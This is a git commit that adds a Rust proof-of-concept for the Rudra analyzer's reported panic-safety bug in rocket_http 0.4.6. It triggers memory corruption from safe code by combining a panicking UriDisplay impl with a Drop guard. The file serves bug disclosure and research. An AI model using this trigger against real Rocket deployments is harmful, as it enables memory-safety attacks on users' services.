9a8dd7e74f6855443a89996676086d75e7f6d1df
Yechan Bae <yechan@gatech.edu>
2021-02-09 17:36:03 -0500

    Report 0131-rocket_http

---
+++ poc/0131-rocket_http.rs
@@ -0,0 +1,53 @@
+/*!
+```rudra-poc
+[target]
+crate = "rocket_http"
+version = "0.4.6"
+
+[test]
+cargo_toolchain = "nightly"
+
+[report]
+issue_url = "https://github.com/SergioBenitez/Rocket/issues/1534"
+issue_date = 2021-02-09
+
+[[bugs]]
+analyzer = "UnsafeDataflow"
+bug_class = "PanicSafety"
+rudra_report_locations = ["src/uri/formatter.rs:334:5: 357:6"]
+```
+!*/
+#![forbid(unsafe_code)]
+
+use rocket_http::uri::{Formatter, Query, UriDisplay};
+
+struct MyDisplay;
+
+struct MyValue;
+
+impl UriDisplay<Query> for MyValue {
+    fn fmt(&self, _f: &mut Formatter<Query>) -> std::fmt::Result {
+        panic!()
+    }
+}
+
+struct Wrapper<'a, 'b>(&'a mut Formatter<'b, Query>);
+
+impl UriDisplay<Query> for MyDisplay {
+    fn fmt(&self, formatter: &mut Formatter<Query>) -> std::fmt::Result {
+        let wrapper = Wrapper(formatter);
+        let temporary_string = String::from("hello");
+        wrapper.0.write_named_value(&temporary_string, MyValue)
+    }
+}
+
+impl<'a, 'b> Drop for Wrapper<'a, 'b> {
+    fn drop(&mut self) {
+        let _overlap = String::from("12345");
+        self.0.write_raw("world").ok();
+    }
+}
+
+fn main() {
+    println!("{}", &MyDisplay as &dyn UriDisplay<Query>);
+}
